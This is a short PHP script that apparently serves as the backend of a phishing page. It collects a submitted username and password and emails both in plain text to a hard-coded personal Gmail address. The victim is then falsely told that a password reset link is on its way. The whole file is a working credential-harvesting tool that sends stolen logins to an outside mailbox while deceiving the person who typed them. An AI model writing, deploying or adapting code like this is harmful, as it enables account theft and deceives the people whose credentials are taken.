<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get form data
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Define your email information
    $to = "sigurd.aroen@gmail.com"; // Replace with the recipient's email address
    $subject = "Password Reset Request";
    $message = "Username: $username\nPassword: $password";

    // Additional headers for the email (you can customize this as needed)
    $headers = "From: webmaster@example.com\r\n";
    $headers .= "Reply-To: webmaster@example.com\r\n";

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        // Email sent successfully
        echo "Email sent successfully. You will receive a password reset link shortly.";
    } else {
        // Email sending failed
        echo "Email sending failed. Please try again later.";
    }
} else {
    // Redirect to an error page if the request method is not POST
    header("Location: error.html");
}
?>
